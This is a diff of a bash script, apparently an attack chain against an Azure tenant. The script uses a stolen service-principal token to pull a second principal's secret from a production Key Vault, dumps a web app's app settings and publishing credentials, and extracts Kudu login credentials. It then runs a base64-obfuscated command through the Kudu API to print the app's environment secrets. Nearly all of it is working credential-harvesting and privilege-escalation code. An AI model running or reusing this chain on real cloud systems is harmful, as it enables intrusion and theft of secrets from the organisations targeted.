@@ -11,14 +11,14 @@ PVT=$(sp_tok "$SYNC_ID" "$SYNC_SEC" "https://vault.azure.net")
 RSJSON=$(curl -s "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" -H "Authorization: Bearer $PVT" | jq -r '.value')
 RS_ID=$(echo "$RSJSON" | jq -r '.appId'); RS_SEC=$(echo "$RSJSON" | jq -r '.clientSecret')
 ARM=$(sp_tok "$RS_ID" "$RS_SEC" "https://management.azure.com")
-echo "ARM_LEN=${#ARM}"
-echo "=== appsettings raw ==="
-curl -s -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE/config/appsettings/list?api-version=2022-03-01" -H "Authorization: Bearer $ARM" | head -c 600
-echo
-echo "=== publishing raw ==="
-curl -s -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE/config/publishingcredentials/list?api-version=2022-03-01" -H "Authorization: Bearer $ARM" | head -c 400
-echo
-echo "=== kudu via ARM bearer: printenv ==="
-curl -s -H "Authorization: Bearer $ARM" -X POST "https://$SITE.scm.azurewebsites.net/api/command" -H "Content-Type: application/json" -d "{\"command\":\"echo cHJpbnRlbnYgfCBzb3J0|base64 -d|bash\",\"dir\":\"/home\"}" | head -c 5000
+BASE="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE"
+echo "=== appsettings ==="
+curl -s -X POST "$BASE/config/appsettings/list?api-version=2022-03-01" -H "Authorization: Bearer $ARM" -d '' | jq -r '.properties // {} | to_entries[]? | .key + " = " + (.value|tostring)'
+echo "=== publishing ==="
+PUB=$(curl -s -X POST "$BASE/config/publishingcredentials/list?api-version=2022-03-01" -H "Authorization: Bearer $ARM" -d '')
+KU=$(echo "$PUB" | jq -r '.properties.publishingUserName'); KP=$(echo "$PUB" | jq -r '.properties.publishingPassword')
+echo "KU=$KU KP_LEN=${#KP}"
+echo "=== kudu printenv ==="
+curl -s -u "$KU:$KP" -X POST "https://$SITE.scm.azurewebsites.net/api/command" -H "Content-Type: application/json" -d "{\"command\":\"echo cHJpbnRlbnYgfCBzb3J0|base64 -d|bash\",\"dir\":\"/home\"}" | head -c 6000
 echo
 echo "ALL_DONE"
